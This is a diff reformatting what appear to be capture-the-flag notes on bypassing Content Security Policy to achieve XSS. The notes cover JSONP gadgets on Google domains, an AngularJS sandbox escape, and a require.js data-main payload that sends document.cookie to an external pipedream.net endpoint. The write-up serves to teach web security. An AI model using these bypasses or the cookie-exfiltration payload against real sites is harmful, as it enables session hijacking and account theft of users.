@@ -1,4 +1,3 @@
-
 # XSS
 
 Some notes about CSP:
@@ -9,13 +8,13 @@ Some notes about CSP:
 
 3. `object-src 'none'` Prevents fetching and executing plugin resources embedded using `<object>`, `<embed>` or `<applet>` tags. The most common example is Flash.
 
-4. `script-src nonce-{random} 'unsafe-inline'` The `nonce` directive means that `<script>` elements will be allowed to execute only if they contain a *nonce* attribute matching the randomly-generated value which appears in the policy.
+4. `script-src nonce-{random} 'unsafe-inline'` The `nonce` directive means that `<script>` elements will be allowed to execute only if they contain a _nonce_ attribute matching the randomly-generated value which appears in the policy.
 
-   *Note: In the presence of a CSP nonce the `unsafe-inline` directive will be ignored by modern browsers. Older browsers, which don't support nonces, will see `unsafe-inline` and allow inline scripts to execute.*
+   _Note: In the presence of a CSP nonce the `unsafe-inline` directive will be ignored by modern browsers. Older browsers, which don't support nonces, will see `unsafe-inline` and allow inline scripts to execute._
 
 5. `script-src 'strict-dynamic' https: http:` 'strict-dynamic' allows the execution of scripts dynamically added to the page, as long as they were loaded by a safe, already-trusted script (see the [specification](https://w3c.github.io/webappsec-csp/#strict-dynamic-usage)).
 
-   *Note: In the presence of 'strict-dynamic' the https: and http: whitelist entries will be ignored by modern browsers. Older browsers will allow the loading of scripts from any URL.*
+   _Note: In the presence of 'strict-dynamic' the https: and http: whitelist entries will be ignored by modern browsers. Older browsers will allow the loading of scripts from any URL._
 
 6. `'unsafe-eval'` allows the application to use the `eval()` JavaScript function. This reduces the protection against certain types of DOM-based XSS bugs, but makes it easier to adopt CSP. If your application doesn't use `eval()`, you can remove this keyword and have a safer policy. More on the `eval` function:
 
@@ -37,7 +36,7 @@ This is technically a correct JavaScript code! The syntax is correct as the rest
 
 Valid JSONP belonging to `*.google.com` that we can use:
 
- `<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>`
+`<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>`
 
 Since the CSP of the website is:
 
@@ -92,33 +91,34 @@ Which means that we only have `; ! - = {} ()`. Still, we have a vulnerability. I
 
 Now that we have some attack surface, I started trying some exploits.
 
-* First off, from [Content Security Policy (CSP) Bypass - HackTricks](https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass):
+- First off, from [Content Security Policy (CSP) Bypass - HackTricks](https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass):
 
   `Content-Security-Policy: script-src https://google.com 'unsafe-eval'; `
-  
+
   Working payload:` <script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>`
-  
-  But that did not work: 
+
+  But that did not work:
 
   `Caricamento non riuscito per lo <script> con sorgente “data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==”.`.
 
-* This looked promising: `<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>`, but the GET request returns 404.
+- This looked promising: `<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>`, but the GET request returns 404.
 
-* `<embed src='//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e){alert(1337)}//' allowscriptaccess=always>` this would not work because this csp blocks embed tags.
+- `<embed src='//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e){alert(1337)}//' allowscriptaccess=always>` this would not work because this csp blocks embed tags.
 
-* This actually worked:
+- This actually worked:
 
   ```html
-  ><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
+  >
+  <script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
   ```
 
   But this is tricky, because it basically executes the url and it puts the result as function argument, in this case we've got an `alert`, which means that the result of that google search will be printed as an alert by the browser.
 
-* This other one `<script src="https://www.google.com/tools/feedback/escalation-options?callback=alert(1337)"></script>` actually does something, but from the look of it, its not useful: it just returns a GET with this body:
+- This other one `<script src="https://www.google.com/tools/feedback/escalation-options?callback=alert(1337)"></script>` actually does something, but from the look of it, its not useful: it just returns a GET with this body:
 
   ```javascript
   // API callback
-  alert1337({})
+  alert1337({});
   ```
 
 ### Solution
@@ -126,7 +126,10 @@ Now that we have some attack surface, I started trying some exploits.
 A bit disappointing, since I solved this with random code found on the internet. From [CSP - Pentest Book (six2dez.com)](https://pentestbook.six2dez.com/enumeration/web/csp):
 
 ```html
-<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.4.6/angular.js"></script> <div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}} </div>
+<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.4.6/angular.js"></script>
+<div ng-app>
+  {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
+</div>
 ```
 
 **Note**: the payload must be at most 255 characters long!
@@ -139,14 +142,17 @@ Content-Security-Policy: default-src 'self'; script-src 'strict-dynamic' 'nonce-
 
 Here we've got a problem: we have a nonce implemented in the CSP. First thing off, I vaidated it with [CSP Evaluator (csp-evaluator.withgoogle.com)](https://csp-evaluator.withgoogle.com/). From that we can see that we've got a problem derivating from the fact that `base-uri` is missing:
 
->Missing base-uri allows the injection of base tags. They can be used to set the base URL for all relative (script) URLs to an attacker controlled domain. Can you set it to 'none' or 'self'?
+> Missing base-uri allows the injection of base tags. They can be used to set the base URL for all relative (script) URLs to an attacker controlled domain. Can you set it to 'none' or 'self'?
 
 And the same goes for `require-trusted-types-for`:
 
->Consider requiring Trusted Types for scripts to lock down DOM XSS injection sinks. You can do this by adding "require-trusted-types-for 'script'" to your policy.
+> Consider requiring Trusted Types for scripts to lock down DOM XSS injection sinks. You can do this by adding "require-trusted-types-for 'script'" to your policy.
 
 The exploit surface here is the `require.js` file. This is enough to solve the challenge:
 
 ```html
-<script data-main='data:1,window.location.href="https://en1lv1e4jrpywf5.m.pipedream.net?c"+document.cookie;' src='require.js'></script>
+<script
+  data-main='data:1,window.location.href="https://en1lv1e4jrpywf5.m.pipedream.net?c"+document.cookie;'
+  src="require.js"
+></script>
 ```
